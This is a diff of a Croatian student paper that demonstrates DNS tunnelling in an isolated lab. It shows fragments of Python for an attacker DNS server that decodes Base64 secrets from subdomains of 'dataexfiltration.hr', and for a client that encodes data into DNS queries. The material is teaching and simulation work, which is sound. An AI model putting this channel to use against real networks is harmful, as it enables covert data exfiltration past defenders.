@@ -38,7 +38,6 @@ Praktični dio rada temelji se na izgradnji i simulaciji okruženja u kojem se d
 
 ## 2.2. Metode i tehnike rada
 
-
 Za postavljanje izoliranog okruženja simulacije korišten je Oracle VirtualBox. Odabrana je ova ruta jer on omogućuje stvaranje virtualnog stroja u kontroliranom i izoliranom okruženju. Ovo je od visoke važnosti budući da je tu simuliran sam napad. Također, na ovaj mi je način omogućeno simuliranje nekoliko uloga u napadu (klijent, napadač i sam DNS poslužitelj). 
 
 Operacijski sustav koji je korišten je Ubuntu/Linux Mint 22. Ovaj OS je odabran zbog stabilnosti, jednostavnosti konfiguracije mrežnih servisa i dostupnosti potrebnih alata.
@@ -81,8 +80,6 @@ from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A
 ```
 Modul socket služi za rad s UDP socketima i primanje/slanje DNS paketa, base64 omogućuje dekodiranje poruka koje su skrivene u DNS upitima, dok se pomoću biblioteke dnslib pojednostavljuje parsiranje i generiranje DNS zapisa (upita i odgovora).
 ```
-Ekstrakcija skrivene poruke iz poddomene
-
 Funkcija extract_message_from_subdomain(subdomain) zadužena je za dekodiranje skrivene poruke:
 
 def extract_message_from_subdomain(subdomain):
@@ -92,8 +89,6 @@ def extract_message_from_subdomain(subdomain):
         return f"Error decoding message: {error}"
 ```
 Pretpostavlja se da je tajna poruka kodirana u Base64 formatu i umetnuta u prvi dio domene (poddomenu). Funkcija prima taj niz znakova, pretvara ga u bajtove i potom pokušava dekodirati iz Base64 natrag u čitljiv tekst. U slučaju pogreške (npr. ako niz nije ispravno kodiran), vraća se poruka o grešci. Ovaj korak direktno predstavlja “vađenje” tuneliranih podataka iz DNS upita.
-
-Obrada DNS upita i dekodiranje tajne
 
 Ključna logika implementirana je u funkciji process_dns_query(query_data, client_ip):
 ```
@@ -125,13 +120,11 @@ Sljedeći dio funkcije provjerava radi li se o domeni koja se koristi za tunelir
 
     return response_record.pack()
 ```
-Domena „dataexfiltration.hr“ predstavlja napadačevu domenu namijenjenu eksfiltraciji podataka. Ako se u zahtjevu nalazi ta domena, skripta razbija ime domene na dijelove pomoću točke (split('.')). U slučaju da postoji više od dva dijela (npr. tajnaPoruka.dataexfiltration.hr), pretpostavlja se da je prvi dio (secret_part) Base64-kodirana tajna poruka. Ta se poddomena potom prosljeđuje funkciji extract_message_from_subdomain, a dekodirana poruka ispisuje se u konzolu. Time napadačev poslužitelj “čita” tunelirane podatke skrivenе u DNS imenu.
+Domena “dataexfiltration.hr“ predstavlja napadačevu domenu namijenjenu eksfiltraciji podataka. Ako se u zahtjevu nalazi ta domena, skripta razbija ime domene na dijelove pomoću točke (split('.')). U slučaju da postoji više od dva dijela (npr. tajnaPoruka.dataexfiltration.hr), pretpostavlja se da je prvi dio (secret_part) Base64-kodirana tajna poruka. Ta se poddomena potom prosljeđuje funkciji extract_message_from_subdomain, a dekodirana poruka ispisuje se u konzolu. Time napadačev poslužitelj “čita” tunelirane podatke skrivenе u DNS imenu.
 
 Neovisno o sadržaju poruke, DNS poslužitelj vraća legitiman odgovor klijentu: dodaje A zapis koji traženu domenu mapira na IP adresu 127.0.0.1. Na taj način DNS odgovor izgleda uobičajeno, a tuneliranje ostaje skriveno unutar same strukture upita.
 
 Ako zahtjev nije usmjeren na domenu dataexfiltration.hr, poslužitelj ga označava kao nevažeći za potrebe tuneliranja, ali ga i dalje može obraditi ili ignorirati, ovisno o daljnjoj implementaciji.
-
-Pokretanje DNS poslužitelja
 
 Funkcija run_dns_server implementira samu DNS uslugu koja neprekidno sluša na odabranom portu:
 ```
@@ -171,8 +164,6 @@ import base64
 ```
 Modul dns.message omogućuje stvaranje DNS upita, dns.query upravlja slanjem upita putem UDP protokola, a base64 se koristi za kodiranje tajnih podataka u oblik pogodan za umetanje u ime domene.
 
-Kodiranje podataka u poddomenu
-
 Funkcija encode_data_in_subdomain(data, domain) pretvara proizvoljnu poruku u Base64 format i umetne je kao poddomenu ispred napadačeve domene:
 ```
 def encode_data_in_subdomain(data, domain):
@@ -180,18 +171,9 @@ def encode_data_in_subdomain(data, domain):
     return f"{encoded}.{domain}"
 ```
 
-Postupak je sljedeći:
-
-Poruka (data) se pretvara u bajtove i kodira Base64 algoritmom.
-
-Dobiveni Base64 niz se spaja s domenom napadača, pri čemu se formira DNS ime oblika:
-
-kodiranaPoruka.dataexfiltration.hr
-
+Poruka (data) se pretvara u bajtove i kodira Base64 algoritmom. Dobiveni Base64 niz se spaja s domenom napadača, pri čemu se formira DNS ime oblika “kodiranaPoruka.dataexfiltration.hr”
 
 Ovaj pristup omogućuje skrivanje tajnih podataka unutar DNS upita jer svaki segment domene smije sadržavati alfanumeričke znakove i određene simbole — što Base64 ispunjava.
-
-Slanje tunelirane poruke DNS upitom
 
 Glavna funkcija transmit_dns_tunnel_message zadužena je za sastavljanje DNS upita, enkapsulaciju poruke te slanje upita prema ciljnom DNS poslužitelju:
 ```
@@ -205,22 +187,19 @@ def transmit_dns_tunnel_message(server, domain, message, port=53):
     except Exception as e:
         print(f"Transmission failed: {e}")
 ```
-
 Ova funkcija radi nekoliko ključnih koraka:
 
-Skrivanje poruke – poziva se encode_data_in_subdomain, koja poruku pretvara u Base64 i smješta je u ime domene.
+Skrivanje poruke
 
-Stvaranje DNS upita – pomoću dns.message.make_query kreira se standardni DNS A upit za domenu koja u sebi nosi skrivenu poruku.
+Stvaranje DNS upita - pomoću dns.message.make_query kreira se standardni DNS A upit za domenu koja u sebi nosi skrivenu poruku.
 
-Slanje upita UDP-om – dns.query.udp šalje DNS upit na adresu simuliranog poslužitelja.
+Slanje upita UDP-om - dns.query.udp šalje DNS upit na adresu simuliranog poslužitelja.
 
-Ispis rezultata – skripta prikazuje izvorni tekst poruke, njezinu kodiranu verziju te DNS odgovor primljen sa servera.
+Ispis rezultata - skripta prikazuje izvorni tekst poruke, njezinu kodiranu verziju te DNS odgovor primljen sa servera.
 
 U slučaju problema (npr. nedostupan server), funkcija hvata iznimku i ispisuje poruku o grešci.
 
 Ovaj mehanizam vjerno predstavlja klijentsku stranu DNS tunnelinga — napadač šalje kriptirane podatke unutar DNS upita, a poslužitelj ih dekodira.
-
-Glavni dio skripte
 
 U glavnom dijelu definiraju se parametri tuneliranja i pokreće se funkcija za slanje poruke:
 ```
@@ -233,7 +212,6 @@ if __name__ == "__main__":
 
     transmit_dns_tunnel_message(server_ip, domain, msg, port=server_port)
 ```
-
 domain predstavlja kontroliranu domenu napadača.
 
 server_ip i server_port upućuju na lokalni simulirani DNS poslužitelj implementiran ranije.
@@ -243,6 +221,7 @@ msg sadrži podatke koje napadač želi eksfiltrirati.
 Poziv transmit_dns_tunnel_message inicira stvarni DNS tunneling.
 
 Ovaj dio skripte služi kao demonstracija kako se jednostavan tekst može “zapakirati“ u DNS upit i poslati, što u praksi predstavlja osnovni mehanizam DNS eksfiltracije podataka.
+
 
 ## 2.4. Slanje poruke i snimanje prometa
 
